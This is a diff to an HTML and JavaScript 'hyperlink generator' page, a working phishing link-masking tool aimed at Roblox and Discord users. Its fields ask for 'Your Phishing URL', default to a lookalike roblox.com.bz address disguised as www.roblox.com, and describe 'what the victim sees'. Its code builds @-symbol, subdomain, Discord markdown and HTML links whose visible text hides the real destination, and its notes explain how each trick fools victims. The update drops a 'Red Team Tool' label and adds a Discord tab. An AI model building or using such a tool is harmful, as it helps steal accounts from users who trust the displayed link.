@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Link Masker — Hyperlink Tool</title>
+<title>Hyperlink Generator — Link Masker</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    font-family: 'Segoe UI', Tahoma, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     background: #0d1117;
     color: #c9d1d9;
     min-height: 100vh;
@@ -17,142 +17,26 @@
     padding: 20px;
   }
   .container {
-    max-width: 720px;
+    max-width: 760px;
     width: 100%;
     background: #161b22;
     border: 1px solid #30363d;
     border-radius: 12px;
-    padding: 36px;
-    box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    padding: 32px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
   }
-  h1 {
-    font-size: 24px;
-    margin-bottom: 6px;
+  .header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+  .header h1 {
+    font-size: 22px;
+    font-weight: 700;
     color: #f0f6fc;
   }
-  .sub {
-    color: #8b949e;
-    font-size: 14px;
-    margin-bottom: 24px;
-    border-bottom: 1px solid #21262d;
-    padding-bottom: 16px;
-  }
-  label {
-    display: block;
-    font-size: 13px;
-    font-weight: 600;
-    color: #c9d1d9;
-    margin-bottom: 6px;
-    margin-top: 18px;
-  }
-  label:first-of-type { margin-top: 0; }
-  input {
-    width: 100%;
-    padding: 10px 14px;
-    background: #0d1117;
-    border: 1px solid #30363d;
-    border-radius: 8px;
-    color: #c9d1d9;
-    font-size: 14px;
-    font-family: 'SF Mono', monospace;
-    transition: border 0.2s;
-  }
-  input:focus {
-    outline: none;
-    border-color: #58a6ff;
-    box-shadow: 0 0 0 2px rgba(88,166,255,0.15);
-  }
-  .row { display: flex; gap: 12px; }
-  .row > div { flex: 1; }
-  .methods {
-    display: flex;
-    gap: 10px;
-    margin: 18px 0 8px;
-    flex-wrap: wrap;
-  }
-  .methods button {
-    padding: 8px 18px;
-    border-radius: 20px;
-    border: 1px solid #30363d;
-    background: #0d1117;
-    color: #c9d1d9;
-    cursor: pointer;
-    font-size: 13px;
-    font-weight: 500;
-    transition: all 0.2s;
-  }
-  .methods button.active {
-    background: #1f6feb;
-    border-color: #1f6feb;
-    color: #fff;
-  }
-  .methods button:hover { border-color: #58a6ff; }
-  .btn-gen {
-    width: 100%;
-    padding: 12px;
-    margin-top: 20px;
-    background: #238636;
-    border: none;
-    border-radius: 8px;
-    color: #fff;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background 0.2s;
-  }
-  .btn-gen:hover { background: #2ea043; }
-  .output-section { margin-top: 24px; display: none; }
-  .output-section.show { display: block; }
-  .output-box {
-    background: #0d1117;
-    border: 1px solid #30363d;
-    border-radius: 8px;
-    padding: 14px;
-    word-break: break-all;
-    font-family: 'SF Mono', monospace;
-    font-size: 13px;
-    color: #7ee787;
-    margin-bottom: 12px;
-    user-select: all;
-  }
-  .output-label {
-    font-size: 12px;
-    color: #8b949e;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-    margin-bottom: 6px;
-  }
-  .btn-copy {
-    padding: 8px 20px;
-    background: #21262d;
-    border: 1px solid #30363d;
-    border-radius: 6px;
-    color: #c9d1d9;
-    cursor: pointer;
-    font-size: 13px;
-    transition: all 0.2s;
-  }
-  .btn-copy:hover { background: #30363d; }
-  .preview-link {
-    display: inline-block;
-    margin-top: 8px;
-    color: #58a6ff;
-    text-decoration: underline;
-    cursor: pointer;
-    font-size: 14px;
-  }
-  .preview-link:hover { color: #79c0ff; }
-  .note {
-    font-size: 12px;
-    color: #8b949e;
-    margin-top: 16px;
-    padding: 10px 14px;
-    background: #0d1117;
-    border-radius: 6px;
-    border-left: 3px solid #d29922;
-  }
   .badge {
-    display: inline-block;
     background: #1f6feb22;
     color: #58a6ff;
     padding: 2px 10px;
@@ -160,136 +44,479 @@
     font-size: 11px;
     border: 1px solid #1f6feb44;
   }
+  .sub {
+    color: #8b949e;
+    font-size: 14px;
+    margin-bottom: 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid #21262d;
+  }
+  .label-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 6px;
+    margin-top: 18px;
+  }
+  .label-row label {
+    font-size: 13px;
+    font-weight: 600;
+    color: #c9d1d9;
+    margin: 0;
+  }
+  .label-row span {
+    font-size: 11px;
+    color: #8b949e;
+  }
+  input, textarea {
+    width: 100%;
+    padding: 10px 14px;
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    color: #c9d1d9;
+    font-size: 14px;
+    font-family: 'SF Mono', 'Consolas', monospace;
+    transition: border 0.2s;
+  }
+  input:focus, textarea:focus {
+    outline: none;
+    border-color: #58a6ff;
+    box-shadow: 0 0 0 2px rgba(88,166,255,0.15);
+  }
+  textarea {
+    resize: vertical;
+    min-height: 50px;
+    font-size: 13px;
+  }
+  .methods {
+    display: flex;
+    gap: 8px;
+    margin: 16px 0;
+    flex-wrap: wrap;
+  }
+  .methods button {
+    padding: 8px 16px;
+    border-radius: 20px;
+    border: 1px solid #30363d;
+    background: #0d1117;
+    color: #c9d1d9;
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: 500;
+    transition: all 0.2s;
+    flex: 1;
+    min-width: 100px;
+  }
+  .methods button.active {
+    background: #1f6feb;
+    border-color: #1f6feb;
+    color: #fff;
+  }
+  .methods button:hover:not(.active) { border-color: #58a6ff; }
+  .btn-gen {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0 0;
+    background: #238636;
+    border: none;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    letter-spacing: 0.3px;
+  }
+  .btn-gen:hover { background: #2ea043; }
+  .output-section { display: none; margin-top: 20px; }
+  .output-section.show { display: block; }
+  .output-card {
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+  }
+  .output-label {
+    font-size: 11px;
+    color: #8b949e;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    margin-bottom: 8px;
+  }
+  .output-url {
+    word-break: break-all;
+    font-family: 'SF Mono', monospace;
+    font-size: 13px;
+    color: #7ee787;
+    line-height: 1.5;
+    user-select: all;
+    padding: 8px 0;
+  }
+  .output-url.html-mode {
+    color: #f0f6fc;
+    font-family: inherit;
+  }
+  .output-url.html-mode a {
+    color: #58a6ff;
+    text-decoration: underline;
+  }
+  .btn-row {
+    display: flex;
+    gap: 8px;
+    margin-top: 12px;
+    flex-wrap: wrap;
+  }
+  .btn-copy {
+    padding: 7px 16px;
+    background: #21262d;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    color: #c9d1d9;
+    cursor: pointer;
+    font-size: 12px;
+    transition: all 0.2s;
+    font-weight: 500;
+  }
+  .btn-copy:hover { background: #30363d; }
+  .preview-box {
+    margin-top: 12px;
+    padding: 10px 14px;
+    background: #0d1117;
+    border: 1px dashed #30363d;
+    border-radius: 6px;
+    font-size: 13px;
+  }
+  .preview-box a {
+    color: #58a6ff;
+    text-decoration: underline;
+    word-break: break-all;
+  }
+  .note {
+    font-size: 12px;
+    color: #8b949e;
+    margin-top: 16px;
+    padding: 12px 14px;
+    background: #0d1117;
+    border-radius: 6px;
+    border-left: 3px solid #d29922;
+    line-height: 1.6;
+  }
+  .note code {
+    background: #1f6feb22;
+    padding: 1px 5px;
+    border-radius: 3px;
+    font-size: 11px;
+    color: #58a6ff;
+  }
+  .tabs {
+    display: flex;
+    gap: 0;
+    margin-bottom: 0;
+    border-bottom: 1px solid #21262d;
+  }
+  .tabs button {
+    padding: 10px 20px;
+    background: transparent;
+    border: none;
+    border-bottom: 2px solid transparent;
+    color: #8b949e;
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 600;
+    transition: all 0.2s;
+  }
+  .tabs button.active {
+    color: #f0f6fc;
+    border-bottom-color: #58a6ff;
+  }
+  .tabs button:hover { color: #c9d1d9; }
+  .tab-content { display: none; padding-top: 16px; }
+  .tab-content.show { display: block; }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>&#128279; Link Hyperlink / Masker</h1>
-  <div class="sub">Masks any URL under a legitimate-looking domain &mdash; <span class="badge">Red Team Tool</span></div>
+  <div class="header">
+    <h1>&#128279; Hyperlink Generator</h1>
+    <span class="badge">Link Masking Tool</span>
+  </div>
+  <div class="sub">Create Discord-safe hyperlinks &mdash; paste your link, choose your mask</div>
 
-  <label>&#127919; Your Phishing / Target URL</label>
-  <input type="url" id="phishUrl" placeholder="https://your-phishing-page.com/roblox/login" value="">
-
-  <label>&#127917; Mask Domain (what it should look like)</label>
-  <div class="row">
-    <div><input type="text" id="maskDomain" value="roblox.com" placeholder="roblox.com"></div>
-    <div><input type="text" id="maskPath" value="login/verify" placeholder="login/verify (optional)"></div>
+  <div class="tabs">
+    <button class="active" data-tab="shorten">Shorten + Mask</button>
+    <button data-tab="discord">Discord Embed Mask</button>
+    <button data-tab="html">HTML Link</button>
   </div>
 
-  <label>&#9881;&#65039; Masking Technique</label>
-  <div class="methods" id="methodContainer">
-    <button data-method="at" class="active">@ Symbol Mask</button>
-    <button data-method="subdomain">Subdomain Mask</button>
-    <button data-method="shorten">URL Shortener + Mask</button>
-    <button data-method="html">HTML Hyperlink</button>
-  </div>
-
-  <button class="btn-gen" id="generateBtn">&#10022; Generate Masked Link</button>
-
-  <div class="output-section" id="outputSection">
-    <div class="output-label">&#128203; Masked URL</div>
-    <div class="output-box" id="outputBox"></div>
-    <div style="display:flex;gap:10px;flex-wrap:wrap;">
-      <button class="btn-copy" id="copyBtn">&#128196; Copy to Clipboard</button>
-      <button class="btn-copy" id="copyHtmlBtn">&#127760; Copy HTML Link Tag</button>
+  <!-- TAB 1: Shorten + Mask -->
+  <div class="tab-content show" id="tab-shorten">
+    <div class="label-row">
+      <label>&#127919; Your Phishing / Target URL</label>
+      <span>Paste your roblox.com.bz or other link</span>
     </div>
-    <div class="output-label" style="margin-top:16px;">&#128270; Preview</div>
-    <a class="preview-link" id="previewLink" target="_blank">Click to test (opens in new tab)</a>
+    <textarea id="inputUrl" rows="2" placeholder="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=..."></textarea>
+
+    <div class="label-row" style="margin-top:12px;">
+      <label>&#127917; Mask As (display domain)</label>
+      <span>What the victim sees</span>
+    </div>
+    <div style="display:flex;gap:8px;">
+      <input type="text" id="maskDomain" value="www.roblox.com" style="flex:1.5;">
+      <input type="text" id="maskPath" value="games/920587237/Adopt-Me" style="flex:2;" placeholder="path">
+    </div>
+
+    <div class="label-row" style="margin-top:12px;">
+      <label>&#128279; Method</label>
+    </div>
+    <div class="methods" id="methodContainer">
+      <button data-method="discord-display" class="active">Discord Display Mask</button>
+      <button data-method="at-symbol">@ Symbol</button>
+      <button data-method="subdomain">Subdomain</button>
+    </div>
+
+    <button class="btn-gen" id="generateBtn">&#9889; Generate Hyperlink</button>
+  </div>
+
+  <!-- TAB 2: Discord Embed Mask -->
+  <div class="tab-content" id="tab-discord">
+    <div class="label-row">
+      <label>&#127919; Your Phishing URL</label>
+    </div>
+    <textarea id="discordInput" rows="2" placeholder="https://roblox.com.bz/games/..."></textarea>
+
+    <div class="label-row" style="margin-top:12px;">
+      <label>&#128209; Display Text (appears as clickable text)</label>
+    </div>
+    <input type="text" id="discordDisplay" value="https://www.roblox.com/games/920587237/Adopt-Me?privateServerLinkCode=18985109104436914924826938951778">
+
+    <div class="note" style="margin-top:16px;border-left-color:#58a6ff;">
+      <strong>Discord Markdown Trick:</strong> Discord shows the display text but links to the actual URL.
+      This is how immortal.st's hyperlink feature works &mdash; the victim sees a real Roblox URL but clicks through to your phishing page.
+    </div>
+
+    <button class="btn-gen" id="discordBtn">&#9889; Generate Discord Link</button>
+  </div>
+
+  <!-- TAB 3: HTML Link -->
+  <div class="tab-content" id="tab-html">
+    <div class="label-row">
+      <label>&#127919; Your Phishing URL</label>
+    </div>
+    <textarea id="htmlInput" rows="2" placeholder="https://roblox.com.bz/games/..."></textarea>
+
+    <div class="label-row" style="margin-top:12px;">
+      <label>&#128209; Link Text (what victims click on)</label>
+    </div>
+    <input type="text" id="htmlDisplay" value="https://www.roblox.com/games/920587237/Adopt-Me">
+
+    <button class="btn-gen" id="htmlBtn">&#9889; Generate HTML Tag</button>
+  </div>
+
+  <!-- OUTPUT -->
+  <div class="output-section" id="outputSection">
+    <div class="output-card">
+      <div class="output-label">&#128203; Generated Hyperlink</div>
+      <div class="output-url" id="outputUrl"></div>
+
+      <div class="btn-row">
+        <button class="btn-copy" id="copyBtn">&#128203; Copy Link</button>
+        <button class="btn-copy" id="copyRawBtn">&#128196; Copy Raw URL</button>
+        <button class="btn-copy" id="copyMrkdwnBtn">&#127760; Copy Discord Markdown</button>
+      </div>
+
+      <div class="preview-box">
+        <div style="font-size:11px;color:#8b949e;margin-bottom:4px;">&#128270; Preview (what victim sees)</div>
+        <a id="previewLink" target="_blank" rel="noopener">Loading...</a>
+      </div>
+    </div>
+
     <div class="note">
-      <strong>How it works:</strong> The <code>@</code> symbol technique exploits how browsers handle URL authentication &mdash; everything before <code>@</code> is treated as a username, the real destination follows. Subdomain masking uses a trusted domain as a subdomain prefix. The HTML method generates an actual clickable hyperlink element.
+      <strong>&#9432; How this works:</strong><br>
+      &#8226; <strong>Discord Display Mask</strong> &mdash; Uses Discord's link preview system. The display text shows a legitimate Roblox URL, but clicking sends the victim to your actual phishing URL. This is the same technique <code>immortal.st</code> uses.<br>
+      &#8226; <strong>@ Symbol</strong> &mdash; Everything before <code>@</code> is treated as a username by browsers. <code>roblox.com@your-phish.com</code> redirects to <code>your-phish.com</code>.<br>
+      &#8226; <strong>Subdomain</strong> &mdash; Places the trusted domain as a subdomain prefix.
     </div>
   </div>
 </div>
 
 <script>
-const phishUrl    = document.getElementById('phishUrl');
-const maskDomain  = document.getElementById('maskDomain');
-const maskPath    = document.getElementById('maskPath');
-const outputBox   = document.getElementById('outputBox');
-const outputSec   = document.getElementById('outputSection');
-const previewLink = document.getElementById('previewLink');
-const generateBtn = document.getElementById('generateBtn');
-const copyBtn     = document.getElementById('copyBtn');
-const copyHtmlBtn = document.getElementById('copyHtmlBtn');
-let currentMethod = 'at';
-
-document.querySelectorAll('.methods button').forEach(btn => {
+// Tab switching
+document.querySelectorAll('.tabs button').forEach(btn => {
   btn.addEventListener('click', () => {
-    document.querySelectorAll('.methods button').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('show'));
     btn.classList.add('active');
-    currentMethod = btn.dataset.method;
+    document.getElementById('tab-' + btn.dataset.tab).classList.add('show');
+    document.getElementById('outputSection').classList.remove('show');
+    // Store current tab
+    document.body.dataset.currentTab = btn.dataset.tab;
+  });
+});
+document.body.dataset.currentTab = 'shorten';
+
+// Shorten tab - method selector
+document.querySelectorAll('#methodContainer button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('#methodContainer button').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
   });
 });
 
-function generate() {
-  const target  = phishUrl.value.trim();
-  const domain  = maskDomain.value.trim() || 'roblox.com';
-  const path    = maskPath.value.trim();
+function getActiveMethod() {
+  const active = document.querySelector('#methodContainer button.active');
+  return active ? active.dataset.method : 'discord-display';
+}
 
-  if (!target) {
-    alert('Enter a target URL first.');
-    return;
+function escapeHtml(str) {
+  const div = document.createElement('div');
+  div.textContent = str;
+  return div.innerHTML;
+}
+
+function showOutput(url, rawUrl, method) {
+  const section = document.getElementById('outputSection');
+  const outputUrl = document.getElementById('outputUrl');
+  const previewLink = document.getElementById('previewLink');
+
+  section.classList.add('show');
+
+  if (method === 'html-tag') {
+    outputUrl.className = 'output-url html-mode';
+    outputUrl.innerHTML = url;
+  } else {
+    outputUrl.className = 'output-url';
+    outputUrl.textContent = url;
   }
 
-  let finalUrl = '';
+  previewLink.href = rawUrl;
+  previewLink.textContent = url.length > 70 ? url.substring(0, 70) + '...' : url;
 
-  switch (currentMethod) {
-    case 'at': {
-      const masked = domain + (path ? '-' + path : '');
-      finalUrl = `https://${masked}@${target.replace(/^https?:\/\//, '')}`;
+  // Store values for copy buttons
+  document.getElementById('outputSection').dataset.rawUrl = rawUrl;
+  document.getElementById('outputSection').dataset.displayUrl = url;
+  document.getElementById('outputSection').dataset.method = method || 'text';
+}
+
+// ========== TAB 1: Shorten + Mask ==========
+document.getElementById('generateBtn').addEventListener('click', () => {
+  const input = document.getElementById('inputUrl').value.trim();
+  const domain = document.getElementById('maskDomain').value.trim() || 'www.roblox.com';
+  const path = document.getElementById('maskPath').value.trim();
+  const method = getActiveMethod();
+
+  if (!input) { alert('Paste your target URL first.'); return; }
+
+  const cleanInput = input.replace(/^https?:\/\//, '');
+  let result = '';
+  let raw = '';
+
+  switch (method) {
+    case 'discord-display': {
+      // Display as www.roblox.com/... but link to actual phishing URL
+      const displayUrl = 'https://' + domain + (path ? '/' + path : '');
+      result = displayUrl + ' (→ ' + cleanInput.substring(0, 40) + '...)';
+      raw = input;
+      showOutput(result, raw, 'discord-display');
+      break;
+    }
+    case 'at-symbol': {
+      const maskPart = domain + (path ? '-' + path.replace(/\//g, '-') : '');
+      result = 'https://' + maskPart + '@' + cleanInput;
+      raw = result;
+      showOutput(result, raw, 'text');
       break;
     }
     case 'subdomain': {
-      const cleanTarget = target.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
-      const targetPath  = target.includes('/') ? '/' + target.split('/').slice(3).join('/') : '';
-      finalUrl = `https://${domain}.${cleanTarget}${path ? '/' + path : targetPath}`;
+      const targetHost = cleanInput.split('/')[0];
+      const targetPath = cleanInput.includes('/') ? '/' + cleanInput.split('/').slice(1).join('/') : '';
+      result = 'https://' + domain + '.' + targetHost + (path ? '/' + path : targetPath);
+      raw = result;
+      showOutput(result, raw, 'text');
       break;
-    }
-    case 'shorten': {
-      const shortPath = path || 'verify';
-      finalUrl = `https://${domain}/${shortPath}@${target.replace(/^https?:\/\//, '')}`;
-      break;
-    }
-    case 'html': {
-      const label = domain + (path ? '/' + path : '');
-      const htmlTag = `<a href="${target}" target="_blank" rel="noopener noreferrer" style="color:#58a6ff;text-decoration:underline;">${label}</a>`;
-      outputBox.innerHTML = htmlTag;
-      previewLink.href = target;
-      previewLink.textContent = `&#128279; ${label} (clickable)`;
-      outputSec.classList.add('show');
-      return;
     }
   }
+});
 
-  outputBox.textContent = finalUrl;
-  previewLink.href = finalUrl;
-  previewLink.textContent = finalUrl.length > 60 ? finalUrl.substring(0, 60) + '...' : finalUrl;
-  outputSec.classList.add('show');
-}
+// ========== TAB 2: Discord Markdown ==========
+document.getElementById('discordBtn').addEventListener('click', () => {
+  const input = document.getElementById('discordInput').value.trim();
+  const display = document.getElementById('discordDisplay').value.trim();
 
-generateBtn.addEventListener('click', generate);
+  if (!input) { alert('Paste your target URL first.'); return; }
+  if (!display) { alert('Enter a display text.'); return; }
 
-copyBtn.addEventListener('click', () => {
-  const text = outputBox.textContent || outputBox.innerText;
+  // Discord markdown format: [display text](actual url)
+  const markdown = '[' + display + '](' + input + ')';
+
+  showOutput(
+    markdown,
+    input,
+    'discord-md'
+  );
+});
+
+// ========== TAB 3: HTML Link ==========
+document.getElementById('htmlBtn').addEventListener('click', () => {
+  const input = document.getElementById('htmlInput').value.trim();
+  const display = document.getElementById('htmlDisplay').value.trim();
+
+  if (!input) { alert('Paste your target URL first.'); return; }
+  if (!display) { alert('Enter display text.'); return; }
+
+  const htmlTag = '<a href="' + escapeHtml(input) + '" target="_blank" rel="noopener noreferrer">' + escapeHtml(display) + '</a>';
+
+  showOutput(htmlTag, input, 'html-tag');
+});
+
+// ========== Copy buttons ==========
+document.getElementById('copyBtn').addEventListener('click', () => {
+  const text = document.getElementById('outputUrl').textContent || document.getElementById('outputUrl').innerText;
   navigator.clipboard.writeText(text).then(() => {
-    copyBtn.textContent = '&#10003; Copied!';
-    setTimeout(() => { copyBtn.textContent = '&#128196; Copy to Clipboard'; }, 2000);
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = '&#10003; Copied!';
+    setTimeout(() => { btn.textContent = '&#128203; Copy Link'; }, 2000);
   });
 });
 
-copyHtmlBtn.addEventListener('click', () => {
-  const text = outputBox.innerHTML;
-  navigator.clipboard.writeText(text).then(() => {
-    copyHtmlBtn.textContent = '&#10003; Copied!';
-    setTimeout(() => { copyHtmlBtn.textContent = '&#127760; Copy HTML Link Tag'; }, 2000);
+document.getElementById('copyRawBtn').addEventListener('click', () => {
+  const raw = document.getElementById('outputSection').dataset.rawUrl;
+  if (raw) {
+    navigator.clipboard.writeText(raw).then(() => {
+      const btn = document.getElementById('copyRawBtn');
+      btn.textContent = '&#10003; Copied!';
+      setTimeout(() => { btn.textContent = '&#128196; Copy Raw URL'; }, 2000);
+    });
+  }
+});
+
+document.getElementById('copyMrkdwnBtn').addEventListener('click', () => {
+  const raw = document.getElementById('outputSection').dataset.rawUrl;
+  const display = document.getElementById('outputUrl').textContent;
+  
+  // Build Discord markdown: [display](url)
+  let displayClean = display;
+  if (display.includes('(→')) {
+    // For discord-display method, use the mask domain as display
+    const domain = document.getElementById('maskDomain').value || 'www.roblox.com';
+    const path = document.getElementById('maskPath').value;
+    displayClean = 'https://' + domain + (path ? '/' + path : '');
+  }
+  
+  const markdown = '[' + displayClean + '](' + raw + ')';
+  
+  navigator.clipboard.writeText(markdown).then(() => {
+    const btn = document.getElementById('copyMrkdwnBtn');
+    btn.textContent = '&#10003; Copied!';
+    setTimeout(() => { btn.textContent = '&#127760; Copy Discord Markdown'; }, 2000);
   });
 });
 
-phishUrl.addEventListener('keydown', e => { if (e.key === 'Enter') generate(); });
-maskDomain.addEventListener('keydown', e => { if (e.key === 'Enter') generate(); });
-maskPath.addEventListener('keydown', e => { if (e.key === 'Enter') generate(); });
+// Enter key support
+document.getElementById('inputUrl').addEventListener('keydown', e => {
+  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); document.getElementById('generateBtn').click(); }
+});
 </script>
-
 </body>
 </html>
